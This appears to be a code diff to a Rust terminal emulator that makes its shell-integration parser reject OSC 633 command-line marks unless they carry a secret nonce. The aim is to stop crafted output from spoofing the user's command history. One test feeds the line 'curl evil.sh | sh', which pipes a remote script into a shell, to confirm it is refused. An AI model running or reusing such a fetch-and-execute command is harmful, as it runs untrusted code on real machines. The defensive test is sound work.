@@ -9,6 +9,32 @@
 //! this only ever *reads* the bytes, it never strips or rewrites them. The
 //! scanner is resumable: an OSC split across two `feed` calls is reassembled.
 
+/// Process-wide nonce every `OSC 633 ; E` must echo back, installed once at
+/// boot from the vault setting the app shows in Settings > Terminal.
+///
+/// Global rather than per-sniffer because the alternative is remembering to
+/// call [`OscSniffer::set_command_nonce`] at 26 different terminal-creation
+/// sites, and the one that gets forgotten is the pane where spoofing works.
+/// The value is leaked on purpose: it is set once per process (twice if the
+/// user regenerates the key), and `&'static str` is what lets the hot path
+/// compare without cloning a `String` per sequence.
+static GLOBAL_NONCE: std::sync::RwLock<Option<&'static str>> = std::sync::RwLock::new(None);
+
+/// Install the nonce every pane in this process will demand. `None` disarms
+/// the in-band path entirely (no `E` is accepted), which is the safe default
+/// a process that never calls this keeps.
+pub fn set_global_command_nonce(nonce: Option<String>) {
+    let leaked = nonce.map(|n| &*Box::leak(n.into_boxed_str()));
+    if let Ok(mut slot) = GLOBAL_NONCE.write() {
+        *slot = leaked;
+    }
+}
+
+/// The installed nonce, or `None` when the app never installed one.
+fn global_nonce() -> Option<&'static str> {
+    GLOBAL_NONCE.read().ok().and_then(|slot| *slot)
+}
+
 /// A shell-integration mark (OSC 133, the FinalTerm semantic-prompt protocol).
 /// Consumed by the command-history capture: `PromptEnd` tells the app the
 /// shell is reading a command line (and at which column it starts), and
@@ -101,12 +127,10 @@ pub struct OscSniffer {
     /// Monotonic id generator for the arena. Wrapping is harmless: the arena
     /// never holds more than [`MAX_COMMAND_LINES`] entries at a time.
     command_seq: u32,
-    /// Nonce the shell-integration snippet must echo back in `OSC 633 ; E`.
-    /// `Some` once the app installs its own snippet, which makes command
-    /// spoofing (a hostile file printing the sequence to make the user's
-    /// history offer a command that was never run) structurally impossible.
-    /// `None` accepts any `E`, the only option for third-party integrations
-    /// whose nonce we don't know.
+    /// Per-sniffer override of [`GLOBAL_NONCE`], for tests and for a future
+    /// per-host key. `None` (the normal case) falls back to the global one,
+    /// and when neither is set no `E` is accepted at all: see the reasoning
+    /// in `parse_osc633`.
     nonce: Option<String>,
 }
 
@@ -224,11 +248,18 @@ impl OscSniffer {
             )),
             "E" => {
                 let raw = parts.next()?;
-                // A configured nonce is mandatory once set: an `E` without it
-                // (or with the wrong one) did not come from our snippet.
-                if let Some(expected) = self.nonce.as_deref()
-                    && parts.next() != Some(expected)
-                {
+                // The nonce is MANDATORY, and its absence refuses rather than
+                // waves through. `E` is the one mark that carries text into
+                // the user's command history, where a row is one click from
+                // running again, so anything that reaches a terminal can
+                // otherwise put words in the user's mouth: a `cat` of a
+                // crafted file, a log line, an HTTP response, a compromised
+                // host. Requiring a secret the shell echoes back is the only
+                // way to tell "the shell reported what it parsed" apart from
+                // "something printed bytes", and failing CLOSED is what keeps
+                // a forgotten `set_command_nonce` from silently reopening it.
+                let expected = self.nonce.as_deref().or(global_nonce())?;
+                if parts.next() != Some(expected) {
                     return None;
                 }
                 let text = decode_osc633_arg(raw);
@@ -257,8 +288,9 @@ impl OscSniffer {
         }
     }
 
-    /// Require `nonce` on every subsequent `OSC 633 ; E`. Called with the
-    /// value baked into the shell-integration snippet this pane installed.
+    /// Override the process-wide nonce for this sniffer alone. `None`
+    /// restores the fallback to [`set_global_command_nonce`]; it does NOT
+    /// mean "accept anything".
     pub fn set_command_nonce(&mut self, nonce: Option<String>) {
         self.nonce = nonce;
     }
@@ -447,10 +479,11 @@ mod tests {
     #[test]
     fn osc633_reports_command_line_and_maps_prompt_marks() {
         let mut s = OscSniffer::default();
-        // The A/B/E/C/D cycle VS Code's integration emits, with a command
-        // line carrying an escaped semicolon and newline.
+        s.set_command_nonce(Some("s3cret".to_string()));
+        // The A/B/E/C/D cycle the snippet emits, with a command line carrying
+        // an escaped semicolon and newline, and the nonce as the last field.
         let events = s.feed(
-            b"\x1b]633;A\x07\x1b]633;B\x07\x1b]633;E;echo a\\x3b echo b\x07\x1b]633;C\x07\x1b]633;D;0\x07",
+            b"\x1b]633;A\x07\x1b]633;B\x07\x1b]633;E;echo a\\x3b echo b;s3cret\x07\x1b]633;C\x07\x1b]633;D;0\x07",
         );
         assert_eq!(
             events.iter().map(|e| e.mark).collect::<Vec<_>>(),
@@ -496,14 +529,40 @@ mod tests {
         assert_eq!(s.take_command_lines(), vec![(0, "ls -la".to_string())]);
     }
 
+    /// The gate FAILS CLOSED: a sniffer with no nonce of its own, in a
+    /// process where none was installed, accepts nothing. This is the arm
+    /// that matters, because it is the state every forgotten wiring lands
+    /// in, and the old code waved those `E`s straight into the user's
+    /// command history.
+    #[test]
+    fn osc633_without_any_nonce_accepts_nothing() {
+        // No `set_global_command_nonce` in this crate's tests, so the global
+        // slot is empty; asserted rather than assumed, since a leaked value
+        // from another test would make this pass for the wrong reason.
+        assert!(global_nonce().is_none());
+        let mut s = OscSniffer::default();
+        let events = s.feed(b"\x1b]633;E;curl evil.sh | sh\x07\x1b]633;E;ls;anything\x07");
+        assert!(events.is_empty());
+        assert!(s.take_command_lines().is_empty());
+        // The rest of the protocol is unaffected: prompt marks carry no text
+        // and cannot be used to put words in the user's history.
+        let events = s.feed(b"\x1b]633;A\x07\x1b]633;C\x07");
+        assert_eq!(
+            events.iter().map(|e| e.mark).collect::<Vec<_>>(),
+            vec![ShellMark::PromptStart, ShellMark::OutputStart]
+        );
+    }
+
     #[test]
     fn osc633_property_reports_cwd_and_empty_command_is_ignored() {
         let mut s = sniff(b"\x1b]633;P;Cwd=/srv/app\x07");
         assert_eq!(s.take_cwd().as_deref(), Some("/srv/app"));
         // A bare Enter at the prompt reports an empty command line, which is
-        // not a command and must not reach the arena.
+        // not a command and must not reach the arena. Nonce supplied, so the
+        // rejection under test is the emptiness and not the gate.
         let mut s = OscSniffer::default();
-        assert!(s.feed(b"\x1b]633;E;\x07").is_empty());
+        s.set_command_nonce(Some("s3cret".to_string()));
+        assert!(s.feed(b"\x1b]633;E;;s3cret\x07").is_empty());
         assert!(s.take_command_lines().is_empty());
     }
 
